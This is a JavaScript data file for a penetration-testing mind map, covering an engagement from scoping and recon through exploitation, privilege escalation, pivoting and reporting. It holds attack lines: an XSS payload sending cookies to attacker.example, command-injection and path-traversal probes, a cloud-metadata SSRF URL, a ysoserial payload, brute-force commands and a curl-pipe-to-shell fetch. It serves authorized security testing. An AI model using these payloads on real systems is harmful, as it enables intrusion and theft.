window.MINDMAP_GENERAL_DATA = {
  root: {
    id: 'gen-root',
    data: {
      label: 'General Pentest',
      description: 'Engagement Workflow',
      descriptionMd:
        '## Engagement Workflow\n- Pre-Engagement\n- Recon\n- Vulnerability Analysis\n- Exploit\n- Post-Exploit\n- Reporting\n- Retest / Validation\n',
      commands: [],
      type: 'root',
      emoji: '🛡️',
      resources: [
        { title: 'NIST SP 800-115 (Technical Guide to Information Security Testing)', url: 'https://csrc.nist.gov/publications/detail/sp/800-115/final' },
        { title: 'OWASP Web Security Testing Guide', url: 'https://owasp.org/www-project-web-security-testing-guide/' }
      ]
    },
    children: [
      {
        id: 'pre-engagement',
        data: {
          label: 'Pre-Engagement',
          description: 'Rules, Scope, and Safety',
          descriptionMd:
            '### Pre-Engagement\nDefine **authorization**, scope boundaries, safety constraints, and success criteria before touching targets.\n\n- In-scope assets (hosts, apps, cloud accounts)\n- Out-of-scope exclusions\n- Testing windows & rate limits\n- Data handling & evidence rules\n- Comms & escalation (on-call, incident triggers)\n',
          commands: [
            { description: 'Checklist (local notes)', code: 'mkdir -p engagement/{scope,notes,evidence,report}' },
            { description: 'Time sync (evidence integrity)', code: 'timedatectl status' }
          ],
          type: 'category',
          emoji: '🧾',
          resources: [
            { title: 'PTES Pre-Engagement', url: 'https://www.pentest-standard.org/index.php/Pre-engagement' },
            { title: 'OWASP Testing Guide - Before the Audit', url: 'https://owasp.org/www-project-web-security-testing-guide/v4.2/2-Introduction/02-Testing_Process' }
          ]
        },
        children: [
          {
            id: 'scope',
            data: {
              label: 'Scope & ROE',
              description: 'Authorization & Boundaries',
              descriptionMd:
                '### Scope & Rules of Engagement\nLock down what is allowed: **targets**, **methods**, **limits**, and **stop conditions**.\n\n- Authentication testing policy (test accounts)\n- DoS / stress testing policy\n- Phishing / social constraints (if any)\n- Data exfil simulation boundaries\n',
              commands: [
                { description: 'Scope file (example)', code: 'cat > scope.md << "EOF"\n# Scope\n## In-scope\n- \n## Out-of-scope\n- \n## Constraints\n- \n## Contacts\n- \nEOF' }
              ],
              type: 'technique',
              emoji: '📜',
              resources: []
            },
            children: []
          },
          {
            id: 'opsec',
            data: {
              label: 'OpSec & Safety',
              description: 'Reduce risk during testing',
              descriptionMd:
                '### Operational Safety\nKeep tests controlled and reversible.\n\n- Prefer read-only discovery first\n- Throttle scanners (rate, concurrency)\n- Avoid destructive payloads\n- Keep clean evidence trails\n',
              commands: [
                { description: 'User agent / headers baseline', code: 'export UA="Pentest-Engagement (contact: security@company.tld)"' }
              ],
              type: 'technique',
              emoji: '🧯',
              resources: []
            },
            children: []
          }
        ]
      },

      {
        id: 'recon',
        data: {
          label: 'Reconnaissance',
          description: 'Information Gathering',
          descriptionMd: '### Recon\nStart with intelligence gathering to shape the attack plan.',
          commands: [],
          type: 'category',
          emoji: '🔎',
          resources: [
            { title: 'OWASP WSTG - Information Gathering', url: 'https://owasp.org/www-project-web-security-testing-guide/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/' }
          ]
        },
        children: [
          {
            id: 'passive',
            data: {
              label: 'Passive Recon',
              description: 'OSINT & Footprinting',
              descriptionMd: '### Passive Recon\nLow-noise discovery using public data sources.',
              commands: [],
              type: 'category',
              emoji: '👁️',
              resources: []
            },
            children: [
              {
                id: 'osint',
                data: {
                  label: 'OSINT',
                  description: 'Open Source Intel',
                  descriptionMd: '### OSINT\n- Company domains\n- Employee names\n- Public leaks\n- Public docs & metadata\n',
                  commands: [
                    { description: 'Google Dorks', code: 'site:target.com filetype:pdf confidential' },
                    { description: 'Whois', code: 'whois target.com' },
                    { description: 'Shodan', code: 'shodan search "org:Target"' }
                  ],
                  type: 'technique',
                  emoji: '🌐',
                  resources: []
                },
                children: []
              },
              {
                id: 'subdomains',
                data: {
                  label: 'Subdomains',
                  description: 'Expansion',
                  descriptionMd: '### Subdomain Discovery\nUse multiple sources and combine results.',
                  commands: [
                    { description: 'Subfinder', code: 'subfinder -d target.com -o subs.txt' },
                    { description: 'Amass', code: 'amass enum -d target.com -o amass.txt' }
                  ],
                  type: 'tool',
                  emoji: '📋',
                  resources: []
                },
                children: []
              },
              {
                id: 'cert-transparency',
                data: {
                  label: 'Certificate Transparency',
                  description: 'Discover hostnames via cert logs',
                  descriptionMd:
                    '### Certificate Transparency\nCertificates often reveal **hidden hostnames** and environments.\n',
                  commands: [
                    { description: 'crt.sh (quick view)', code: 'python3 - << "PY"\nimport requests, sys\nq = sys.argv[1] if len(sys.argv)>1 else "target.com"\nurl=f"https://crt.sh/?q=%25.{q}&output=json"\nprint(url)\nPY target.com' }
                  ],
                  type: 'technique',
                  emoji: '📜',
                  resources: []
                },
                children: []
              },
              {
                id: 'code-osint',
                data: {
                  label: 'Code OSINT',
                  description: 'Repos, keys, endpoints',
                  descriptionMd:
                    '### Code OSINT\nSearch public repositories for **endpoints**, **secrets**, and **environment hints**.\n',
                  commands: [
                    { description: 'GitHub dork idea', code: '"target.com" (api_key OR secret OR token) -example' }
                  ],
                  type: 'technique',
                  emoji: '🧬',
                  resources: []
                },
                children: []
              },
              {
                id: 'metadata',
                data: {
                  label: 'Document Metadata',
                  description: 'Users, paths, software',
                  descriptionMd:
                    '### Metadata\nPublic documents can leak usernames, internal paths, and tooling.',
                  commands: [
                    { description: 'Extract metadata', code: 'exiftool file.pdf' }
                  ],
                  type: 'tool',
                  emoji: '🧾',
                  resources: []
                },
                children: []
              }
            ]
          },

          {
            id: 'active',
            data: {
              label: 'Active Recon',
              description: 'Scanning & Probing',
              descriptionMd: '### Active Recon\nProbe endpoints to identify services.',
              commands: [],
              type: 'category',
              emoji: '📈',
              resources: []
            },
            children: [
              {
                id: 'port-scan',
                data: {
                  label: 'Port Scanning',
                  description: 'Service Discovery',
                  descriptionMd: '### Port Scanning\nFind open services and versions.',
                  commands: [
                    { description: 'Nmap TCP', code: 'nmap -sC -sV -p- target' },
                    { description: 'Nmap UDP', code: 'nmap -sU --top-ports 100 target' },
                    { description: 'Masscan', code: 'masscan -p1-65535 target --rate=1000' }
                  ],
                  type: 'tool',
                  emoji: '🎯',
                  resources: [
                    { title: 'Nmap Reference Guide', url: 'https://nmap.org/book/man.html' }
                  ]
                },
                children: []
              },
              {
                id: 'service-enum',
                data: {
                  label: 'Service Enumeration',
                  description: 'Bannering & protocol checks',
                  descriptionMd:
                    '### Service Enumeration\nConfirm what is actually running and identify weak configurations.\n',
                  commands: [
                    { description: 'Nmap scripts by port', code: 'nmap -sV --script="default,safe,discovery" -p 22,80,443,445,3389 target' },
                    { description: 'TLS overview', code: 'nmap --script ssl-enum-ciphers -p 443 target' }
                  ],
                  type: 'technique',
                  emoji: '🧭',
                  resources: []
                },
                children: []
              },
              {
                id: 'web-enum',
                data: {
                  label: 'Web Enumeration',
                  description: 'Directories & Tech',
                  descriptionMd: '### Web Enumeration\nFingerprint and enumerate web stacks.',
                  commands: [
                    { description: 'Gobuster', code: 'gobuster dir -u url -w wordlist.txt -x php,txt,html' },
                    { description: 'Feroxbuster', code: 'feroxbuster -u url' },
                    { description: 'Wappalyzer', code: 'Identify Technologies' }
                  ],
                  type: 'tool',
                  emoji: '🌐',
                  resources: []
                },
                children: []
              },
              {
                id: 'http-probing',
                data: {
                  label: 'HTTP Probing',
                  description: 'Status, titles, redirects',
                  descriptionMd:
                    '### HTTP Probing\nNormalize large URL sets and quickly spot interesting apps.\n',
                  commands: [
                    { description: 'httpx (example)', code: 'httpx -l subs.txt -ports 80,443,8080,8443 -title -status-code -follow-redirects -o alive.txt' }
                  ],
                  type: 'tool',
                  emoji: '🛰️',
                  resources: []
                },
                children: []
              },
              {
                id: 'dns-enum',
                data: {
                  label: 'DNS Enumeration',
                  description: 'Records & misconfig',
                  descriptionMd:
                    '### DNS Enumeration\nEnumerate records, verify split-horizon assumptions, and find forgotten hosts.',
                  commands: [
                    { description: 'dig basics', code: 'dig A target.com +short && dig TXT target.com +short' },
                    { description: 'Zone transfer check', code: 'dig AXFR target.com @ns1.target.com' }
                  ],
                  type: 'technique',
                  emoji: '🧷',
                  resources: []
                },
                children: []
              }
            ]
          }
        ]
      },

      {
        id: 'vuln-analysis',
        data: {
          label: 'Vulnerability Analysis',
          description: 'Prioritize What to Test',
          descriptionMd:
            '### Vulnerability Analysis\nTurn recon output into a prioritized testing plan.\n\n- Normalize assets (host/service/app)\n- Map attack surface to test cases\n- Run targeted scanners (carefully)\n- Triage findings (false positives vs exploitable)\n',
          commands: [],
          type: 'category',
          emoji: '🧪',
          resources: [
            { title: 'OWASP ASVS', url: 'https://owasp.org/www-project-application-security-verification-standard/' }
          ]
        },
        children: [
          {
            id: 'web-vuln-scan',
            data: {
              label: 'Web Scanning',
              description: 'Targeted templates & checks',
              descriptionMd:
                '### Web Scanning\nUse scanners to **augment** manual testing, not replace it.',
              commands: [
                { description: 'Nuclei (example)', code: 'nuclei -l alive.txt -severity low,medium,high,critical -o nuclei.txt' },
                { description: 'Nikto (legacy)', code: 'nikto -h https://target.tld' }
              ],
              type: 'tool',
              emoji: '🧰',
              resources: []
            },
            children: []
          },
          {
            id: 'misconfig',
            data: {
              label: 'Misconfigurations',
              description: 'Hardening gaps',
              descriptionMd:
                '### Misconfigurations\nLook for default credentials, exposed admin panels, debug endpoints, directory listing, weak TLS, and verbose errors.',
              commands: [
                { description: 'TLS quick test (example tool)', code: 'testssl.sh https://target.tld' }
              ],
              type: 'technique',
              emoji: '⚙️',
              resources: []
            },
            children: []
          },
          {
            id: 'attack-surface-map',
            data: {
              label: 'Attack Surface Mapping',
              description: 'Inputs, trust boundaries',
              descriptionMd:
                '### Attack Surface Mapping\nIdentify **entry points**: forms, APIs, file uploaders, webhooks, message queues, and integrations.',
              commands: [
                { description: 'Burp idea', code: 'Build site map -> highlight unauth/auth boundaries -> note roles' }
              ],
              type: 'technique',
              emoji: '🗺️',
              resources: []
            },
            children: []
          }
        ]
      },

      {
        id: 'exploitation',
        data: {
          label: 'Exploitation',
          description: 'Gaining Access',
          descriptionMd: '### Exploitation\nPivot from findings into access.',
          commands: [],
          type: 'category',
          emoji: '⚔️',
          resources: []
        },
        children: [
          {
            id: 'web-exploit',
            data: {
              label: 'Web Exploitation',
              description: 'OWASP Top 10 & More',
              descriptionMd: '### Web Exploitation\nTarget common web classes of bugs.',
              commands: [],
              type: 'category',
              emoji: '🌐',
              resources: []
            },
            children: [
              {
                id: 'injection',
                data: {
                  label: 'Injection',
                  description: 'SQLi / Command',
                  descriptionMd: '### Injection\n`SQLi` and command injection to access data or execute.',
                  commands: [
                    { description: 'SQLMap', code: 'sqlmap -u "url?id=1" --batch --dbs' },
                    { description: 'Cmd Injection probe', code: '; whoami; id' }
                  ],
                  type: 'technique',
                  emoji: '🗄️',
                  resources: []
                },
                children: []
              },
              {
                id: 'xss',
                data: {
                  label: 'XSS',
                  description: 'Cross-Site Scripting',
                  descriptionMd: '### XSS\n- Reflected\n- Stored\n- DOM\n',
                  commands: [
                    { description: 'Reflected', code: '<script>alert(1)</script>' },
                    { description: 'Cookie exfil demo', code: '<img src=x onerror=this.src="https://attacker.example/?c="+encodeURIComponent(document.cookie)>' }
                  ],
                  type: 'technique',
                  emoji: '💻',
                  resources: []
                },
                children: []
              },
              {
                id: 'ssrf',
                data: {
                  label: 'SSRF',
                  description: 'Server Side Request Forgery',
                  descriptionMd: '### SSRF\nUse metadata and localhost to pivot.',
                  commands: [
                    { description: 'Localhost', code: 'http://localhost/admin' },
                    { description: 'Cloud Meta (example)', code: 'http://169.254.169.254/latest/meta-data/' }
                  ],
                  type: 'technique',
                  emoji: '🖥️',
                  resources: []
                },
                children: []
              },
              {
                id: 'idor',
                data: {
                  label: 'IDOR',
                  description: 'Insecure Direct Object Reference',
                  descriptionMd: '### IDOR\nManipulate identifiers to access other records.',
                  commands: [{ description: 'Change ID', code: '/api/users/123 -> /api/users/124' }],
                  type: 'technique',
                  emoji: '👤',
                  resources: []
                },
                children: []
              },
              {
                id: 'deserial',
                data: {
                  label: 'Deserialization',
                  description: 'Object Injection',
                  descriptionMd: '### Deserialization\nAbuse unsafe object streams.',
                  commands: [{ description: 'Ysoserial (example)', code: 'java -jar ysoserial.jar CommonsCollections1 "calc.exe"' }],
                  type: 'technique',
                  emoji: '📦',
                  resources: []
                },
                children: []
              },
              {
                id: 'authz-authn',
                data: {
                  label: 'AuthN / AuthZ',
                  description: 'Sessions, tokens, access control',
                  descriptionMd:
                    '### Authentication & Authorization\nTest session handling, token validation, MFA flows, password reset, and role boundaries.',
                  commands: [
                    { description: 'JWT sanity checks (concept)', code: 'Check alg, kid, exp, aud/iss, signature verification, key confusion' }
                  ],
                  type: 'technique',
                  emoji: '🪪',
                  resources: []
                },
                children: []
              },
              {
                id: 'file-upload',
                data: {
                  label: 'File Upload',
                  description: 'Content-type & storage issues',
                  descriptionMd:
                    '### File Upload\nValidate content sniffing, extension filters, storage location, and access controls for uploaded objects.',
                  commands: [
                    { description: 'Quick checks (concept)', code: 'Try polyglots, double extensions, path tricks, and direct object access validation' }
                  ],
                  type: 'technique',
                  emoji: '📤',
                  resources: []
                },
                children: []
              },
              {
                id: 'lfi-path',
                data: {
                  label: 'Path Traversal / LFI',
                  description: 'File reads & include flows',
                  descriptionMd:
                    '### Path Traversal / LFI\nProbe file path parameters and template includes for traversal and local file reads.',
                  commands: [
                    { description: 'Traversal probe', code: '../../../../etc/passwd' }
                  ],
                  type: 'technique',
                  emoji: '🧵',
                  resources: []
                },
                children: []
              },
              {
                id: 'ssti',
                data: {
                  label: 'SSTI',
                  description: 'Server-Side Template Injection',
                  descriptionMd:
                    '### SSTI\nDetect template context and unsafe rendering leading to data exposure or code execution.',
                  commands: [
                    { description: 'Generic detection probe', code: '{{7*7}}  ${7*7}  <%= 7*7 %>' }
                  ],
                  type: 'technique',
                  emoji: '🧩',
                  resources: []
                },
                children: []
              },
              {
                id: 'xxe',
                data: {
                  label: 'XXE',
                  description: 'XML External Entities',
                  descriptionMd:
                    '### XXE\nTest XML parsers for external entity expansion and SSRF-like behaviors.',
                  commands: [
                    { description: 'Concept probe', code: 'Look for XML endpoints; test external entity handling in a controlled way' }
                  ],
                  type: 'technique',
                  emoji: '🧾',
                  resources: []
                },
                children: []
              },
              {
                id: 'csrf',
                data: {
                  label: 'CSRF',
                  description: 'Cross-Site Request Forgery',
                  descriptionMd:
                    '### CSRF\nValidate anti-CSRF tokens, SameSite cookie posture, and state-changing endpoints.',
                  commands: [
                    { description: 'Checklist', code: 'Token present? bound to session? per-request? SameSite? Origin/Referer validation?' }
                  ],
                  type: 'technique',
                  emoji: '🪝',
                  resources: []
                },
                children: []
              },
              {
                id: 'logic',
                data: {
                  label: 'Business Logic',
                  description: 'Abuse workflows & assumptions',
                  descriptionMd:
                    '### Business Logic\nTest invariant breaks: price manipulation, race conditions, replay, coupon stacking, state confusion.',
                  commands: [
                    { description: 'Race condition', code: 'Parallelize requests; look for double-spend / duplicate redemption' }
                  ],
                  type: 'technique',
                  emoji: '🧠',
                  resources: []
                },
                children: []
              }
            ]
          },

          {
            id: 'net-exploit',
            data: {
              label: 'Network Exploitation',
              description: 'Infrastructure',
              descriptionMd: '### Network Exploitation\nMove from services to shells.',
              commands: [],
              type: 'category',
              emoji: '🕸️',
              resources: []
            },
            children: [
              {
                id: 'brute',
                data: {
                  label: 'Brute Force',
                  description: 'Credential Guessing',
                  descriptionMd: '### Brute Force\nWatch for lockout policies.',
                  commands: [
                    { description: 'Hydra SSH', code: 'hydra -l root -P pass.txt ssh://ip' },
                    { description: 'Hydra RDP', code: 'hydra -l User -P pass.txt rdp://ip' }
                  ],
                  type: 'tool',
                  emoji: '🔒',
                  resources: []
                },
                children: []
              },
              {
                id: 'metasploit',
                data: {
                  label: 'Metasploit',
                  description: 'Framework',
                  descriptionMd: '### Metasploit\nLeverage modules and handlers.',
                  commands: [
                    { description: 'Search', code: 'search type:exploit name:service' },
                    { description: 'Handler', code: 'use exploit/multi/handler' }
                  ],
                  type: 'tool',
                  emoji: '💣',
                  resources: []
                },
                children: []
              },
              {
                id: 'snmp',
                data: {
                  label: 'SNMP',
                  description: 'Exposure & enumeration',
                  descriptionMd:
                    '### SNMP\nCheck for default communities and sensitive OIDs (device info, routing, interfaces).',
                  commands: [
                    { description: 'snmpwalk (example)', code: 'snmpwalk -v2c -c public ip 1.3.6.1.2.1.1' }
                  ],
                  type: 'technique',
                  emoji: '📡',
                  resources: []
                },
                children: []
              },
              {
                id: 'smtp',
                data: {
                  label: 'SMTP',
                  description: 'Open relay & info leaks',
                  descriptionMd:
                    '### SMTP\nLook for banner leaks, user enumeration behaviors, relay configuration, and STARTTLS posture.',
                  commands: [
                    { description: 'Banner/ehlo (example)', code: 'nc -nv ip 25' }
                  ],
                  type: 'technique',
                  emoji: '✉️',
                  resources: []
                },
                children: []
              },
              {
                id: 'vpn-gateways',
                data: {
                  label: 'VPN / Remote Access',
                  description: 'Gateways, portals, MFA',
                  descriptionMd:
                    '### VPN / Remote Access\nEnumerate portals, versions, exposed admin panels, and auth flows.',
                  commands: [
                    { description: 'Portal fingerprint (concept)', code: 'Check headers, certs, login flows; map versions carefully' }
                  ],
                  type: 'technique',
                  emoji: '🧷',
                  resources: []
                },
                children: []
              }
            ]
          },

          {
            id: 'cloud-exploit',
            data: {
              label: 'Cloud & SaaS',
              description: 'Storage, IAM, metadata',
              descriptionMd:
                '### Cloud & SaaS\nFocus on **misconfiguration** and **identity/permissions** problems rather than internal directory techniques.\n',
              commands: [],
              type: 'category',
              emoji: '☁️',
              resources: []
            },
            children: [
              {
                id: 'storage-misconfig',
                data: {
                  label: 'Storage Misconfig',
                  description: 'Public buckets / blobs',
                  descriptionMd:
                    '### Storage Misconfiguration\nTest object-level access controls, listing permissions, and accidental public exposure.',
                  commands: [
                    { description: 'Checklist', code: 'Is listing enabled? Are objects world-readable? Are write perms possible? Is versioning/logging enabled?' }
                  ],
                  type: 'technique',
                  emoji: '🪣',
                  resources: []
                },
                children: []
              },
              {
                id: 'iam',
                data: {
                  label: 'Identity & Permissions',
                  description: 'Over-privileged roles',
                  descriptionMd:
                    '### IAM\nLook for privilege escalation paths via overly broad permissions and unsafe trust relationships.',
                  commands: [
                    { description: 'Checklist', code: 'Enumerate roles/policies -> identify wildcards -> check assume-role/trust -> least privilege gaps' }
                  ],
                  type: 'technique',
                  emoji: '🗝️',
                  resources: []
                },
                children: []
              },
              {
                id: 'metadata-services',
                data: {
                  label: 'Metadata Services',
                  description: 'IMDS-like surfaces',
                  descriptionMd:
                    '### Metadata Services\nIf SSRF exists, validate exposure to instance metadata in a controlled manner.',
                  commands: [
                    { description: 'Concept', code: 'Validate SSRF egress controls; test metadata endpoints only within engagement constraints' }
                  ],
                  type: 'technique',
                  emoji: '🏷️',
                  resources: []
                },
                children: []
              }
            ]
          }
        ]
      },

      {
        id: 'post-exp',
        data: {
          label: 'Post Exploitation',
          description: 'PrivEsc & Loot',
          descriptionMd: '### Post Exploitation\nPrivilege escalation, proof of impact, and safe cleanup.',
          commands: [],
          type: 'category',
          emoji: '🚩',
          resources: []
        },
        children: [
          {
            id: 'linux-pe',
            data: {
              label: 'Linux PrivEsc',
              description: 'Root Access',
              descriptionMd: '### Linux PrivEsc\nEnumerate, exploit, and loot.',
              commands: [],
              type: 'category',
              emoji: '🐧',
              resources: []
            },
            children: [
              {
                id: 'linpeas',
                data: {
                  label: 'LinPEAS',
                  description: 'Auto Enumeration',
                  descriptionMd: '### LinPEAS\nQuick enumeration workflow.',
                  commands: [{ description: 'Run (prefer reviewed local copy)', code: 'curl -L linpeas.sh | sh' }],
                  type: 'tool',
                  emoji: '🔎',
                  resources: []
                },
                children: []
              },
              {
                id: 'cron',
                data: {
                  label: 'Cron Jobs',
                  description: 'Scheduled Tasks',
                  descriptionMd: '### Cron Jobs\nInspect scheduled tasks and writable scripts.',
                  commands: [
                    { description: 'Cat Crontab', code: 'cat /etc/crontab' },
                    { description: 'Monitor Processes', code: 'pspy64' }
                  ],
                  type: 'technique',
                  emoji: '⏱️',
                  resources: []
                },
                children: []
              },
              {
                id: 'suid-gtfobins',
                data: {
                  label: 'SUID / GTFOBins',
                  description: 'Binaries',
                  descriptionMd: '### SUID\nFind binaries that can elevate.',
                  commands: [
                    { description: 'Find SUID', code: 'find / -perm -u=s -type f 2>/dev/null' },
                    { description: 'Example (interactive)', code: 'nmap --interactive -> !sh' }
                  ],
                  type: 'technique',
                  emoji: '🧑‍💻',
                  resources: []
                },
                children: []
              },
              {
                id: 'secrets-linux',
                data: {
                  label: 'Secrets & Config',
                  description: 'Keys, env vars, config files',
                  descriptionMd:
                    '### Secrets & Config\nIdentify credentials in configs, environment variables, history files, and service units.',
                  commands: [
                    { description: 'Interesting files', code: 'ls -la /home/* && sudo -l && env | sort' }
                  ],
                  type: 'technique',
                  emoji: '🔑',
                  resources: []
                },
                children: []
              }
            ]
          },

          {
            id: 'win-pe',
            data: {
              label: 'Windows PrivEsc',
              description: 'System Access',
              descriptionMd: '### Windows PrivEsc\nEnumerate and exploit misconfigurations.',
              commands: [],
              type: 'category',
              emoji: '🪟',
              resources: []
            },
            children: [
              {
                id: 'winpeas',
                data: {
                  label: 'WinPEAS',
                  description: 'Auto Enumeration',
                  descriptionMd: '### WinPEAS\nQuick enumeration workflow.',
                  commands: [{ description: 'Run', code: '.\\winPEASx64.exe' }],
                  type: 'tool',
                  emoji: '🔎',
                  resources: []
                },
                children: []
              },
              {
                id: 'kernel-exploit',
                data: {
                  label: 'Kernel Exploits',
                  description: 'Missing Patches',
                  descriptionMd: '### Kernel Exploits\nFind missing patches and leverage known bugs.',
                  commands: [
                    { description: 'Watson', code: 'Watson.exe' },
                    { description: 'Sherlock', code: 'Sherlock.ps1' }
                  ],
                  type: 'technique',
                  emoji: '🧠',
                  resources: []
                },
                children: []
              },
              {
                id: 'services-misconfig',
                data: {
                  label: 'Service Misconfig',
                  description: 'Permissions & paths',
                  descriptionMd:
                    '### Service Misconfig\nCheck service permissions, writable paths, insecure configs, and credential material.',
                  commands: [
                    { description: 'Service inventory', code: 'sc query type= service state= all' }
                  ],
                  type: 'technique',
                  emoji: '🧰',
                  resources: []
                },
                children: []
              }
            ]
          },

          {
            id: 'pivoting',
            data: {
              label: 'Pivoting',
              description: 'Tunneling',
              descriptionMd: '### Pivoting\nReach internal segments.',
              commands: [],
              type: 'category',
              emoji: '🔀',
              resources: []
            },
            children: [
              {
                id: 'chisel',
                data: {
                  label: 'Chisel',
                  description: 'Tunnel over HTTP',
                  descriptionMd: '### Chisel\nPivot over HTTP with reverse tunnel.',
                  commands: [
                    { description: 'Server', code: 'chisel server -p 8000 --reverse' },
                    { description: 'Client', code: 'chisel client ip:8000 R:socks' }
                  ],
                  type: 'tool',
                  emoji: '🕸️',
                  resources: []
                },
                children: []
              },
              {
                id: 'ssh-tunnel',
                data: {
                  label: 'SSH Tunnel',
                  description: 'Port Forwarding',
                  descriptionMd: '### SSH Tunnels\nLocal, remote, and dynamic forwarding.',
                  commands: [
                    { description: 'Local', code: 'ssh -L 8080:127.0.0.1:80 user@target' },
                    { description: 'Dynamic (SOCKS)', code: 'ssh -D 1080 user@target' }
                  ],
                  type: 'technique',
                  emoji: '🧑‍💻',
                  resources: []
                },
                children: []
              },
              {
                id: 'proxychains',
                data: {
                  label: 'Proxying',
                  description: 'Route tools through pivot',
                  descriptionMd:
                    '### Proxying\nStandardize traffic through a single pivot and keep logs clean.',
                  commands: [
                    { description: 'Proxychains (example)', code: 'proxychains -q nmap -sT -Pn -p 80,443 internal.host' }
                  ],
                  type: 'tool',
                  emoji: '🧷',
                  resources: []
                },
                children: []
              }
            ]
          },

          {
            id: 'impact-proof',
            data: {
              label: 'Impact Proof',
              description: 'Demonstrate risk safely',
              descriptionMd:
                '### Proof of Impact\nCollect minimal evidence to demonstrate risk without unnecessary data exposure.\n\n- Access level achieved\n- Data classification impacted\n- Control bypass demonstrated\n- Repro steps & mitigations\n',
              commands: [
                { description: 'Evidence hygiene', code: 'Record timestamps, request IDs, and minimal artifacts; avoid full dumps.' }
              ],
              type: 'technique',
              emoji: '📸',
              resources: []
            },
            children: []
          },

          {
            id: 'cleanup',
            data: {
              label: 'Cleanup',
              description: 'Revert changes',
              descriptionMd:
                '### Cleanup\nRemove test accounts, shells, scheduled tasks, temporary files, and restore configurations if modified.\n',
              commands: [
                { description: 'Cleanup log (notes)', code: 'echo "$(date -Is) cleanup: ..." >> notes/cleanup.log' }
              ],
              type: 'technique',
              emoji: '🧹',
              resources: []
            },
            children: []
          }
        ]
      },

      {
        id: 'reporting',
        data: {
          label: 'Reporting',
          description: 'Write, Communicate, Remediate',
          descriptionMd:
            '### Reporting\nDeliver actionable findings with reproducible steps and clear remediation.\n\n- Executive summary\n- Methodology & scope\n- Findings (risk, impact, evidence)\n- Remediation guidance\n- Appendix (assets, tooling, timelines)\n',
          commands: [],
          type: 'category',
          emoji: '📝',
          resources: [
            { title: 'OWASP Risk Rating Methodology', url: 'https://owasp.org/www-project-risk-rating-methodology/' },
            { title: 'MITRE CWE Top 25', url: 'https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html' }
          ]
        },
        children: [
          {
            id: 'triage-severity',
            data: {
              label: 'Severity & Triage',
              description: 'Risk scoring',
              descriptionMd:
                '### Severity & Triage\nScore based on likelihood × impact, adjusted by compensating controls and exploitability.',
              commands: [
                { description: 'CVSS note', code: 'Use CVSS where applicable; add business context & environment modifiers.' }
              ],
              type: 'technique',
              emoji: '📊',
              resources: []
            },
            children: []
          },
          {
            id: 'writeups',
            data: {
              label: 'Writeups',
              description: 'Repro + fix',
              descriptionMd:
                '### Writeup Structure\nInclude: summary, affected assets, steps to reproduce, expected vs actual, impact, screenshots/requests, and remediation.',
              commands: [
                { description: 'Finding template (stub)', code: 'cat > report/finding-template.md << "EOF"\n# Finding: \n## Summary\n\n## Affected Assets\n\n## Steps to Reproduce\n\n## Impact\n\n## Evidence\n\n## Remediation\n\n## References\nEOF' }
              ],
              type: 'technique',
              emoji: '🧷',
              resources: []
            },
            children: []
          }
        ]
      },

      {
        id: 'retest',
        data: {
          label: 'Retest / Validation',
          description: 'Verify fixes',
          descriptionMd:
            '### Retest\nReproduce only what is needed to confirm remediation and verify no regressions.',
          commands: [
            { description: 'Retest notes', code: 'echo "$(date -Is) retest: finding-id -> PASS/FAIL" >> notes/retest.log' }
          ],
          type: 'category',
          emoji: '✅',
          resources: []
        },
        children: []
      }
    ]
  },

  extraEdges: [
    {
      id: 'e-scope-recon',
      source: 'scope',
      target: 'recon',
      data: {
        label: 'Authorization',
        type: 'flow',
        descriptionMd: 'Scope and ROE **govern** what recon is allowed and how noisy it can be.'
      }
    },
    {
      id: 'e-osint-web-enum',
      source: 'osint',
      target: 'web-enum',
      data: {
        label: 'Targets',
        type: 'context',
        descriptionMd: 'OSINT results often **seed** web enumeration targets and tech fingerprints.'
      }
    },
    {
      id: 'e-subdomains-port-scan',
      source: 'subdomains',
      target: 'port-scan',
      data: {
        label: 'Scope Expansion',
        type: 'flow',
        descriptionMd: 'Discovered subdomains expand the **port scanning** scope.'
      }
    },
    {
      id: 'e-active-vuln',
      source: 'active',
      target: 'vuln-analysis',
      data: {
        label: 'Triage Inputs',
        type: 'flow',
        descriptionMd: 'Active recon outputs become inputs for **vulnerability analysis** and prioritization.'
      }
    },
    {
      id: 'e-web-enum-injection',
      source: 'web-enum',
      target: 'injection',
      data: {
        label: 'Attack Surface',
        type: 'flow',
        descriptionMd: 'Enumeration highlights **inputs** to test for injection.'
      }
    },
    {
      id: 'e-vuln-exploit',
      source: 'vuln-analysis',
      target: 'exploitation',
      data: {
        label: 'Exploit Plan',
        type: 'flow',
        descriptionMd: 'Validated findings guide **safe** exploitation paths.'
      }
    },
    {
      id: 'e-injection-post-exp',
      source: 'injection',
      target: 'post-exp',
      data: {
        label: 'Shell Access',
        type: 'flow',
        descriptionMd: 'Successful injection can lead into **post-exploitation**.'
      }
    },
    {
      id: 'e-post-report',
      source: 'post-exp',
      target: 'reporting',
      data: {
        label: 'Evidence',
        type: 'flow',
        descriptionMd: 'Post-exploitation evidence feeds the **report** and remediation plan.'
      }
    },
    {
      id: 'e-report-retest',
      source: 'reporting',
      target: 'retest',
      data: {
        label: 'Fix Verification',
        type: 'flow',
        descriptionMd: 'Reported findings drive remediation; retest validates **closure**.'
      }
    },
    {
      id: 'e-brute-metasploit',
      source: 'brute',
      target: 'metasploit',
      data: {
        label: 'Credentials',
        type: 'assist',
        descriptionMd: 'Creds from brute force may unlock Metasploit modules.'
      }
    }
  ]
};
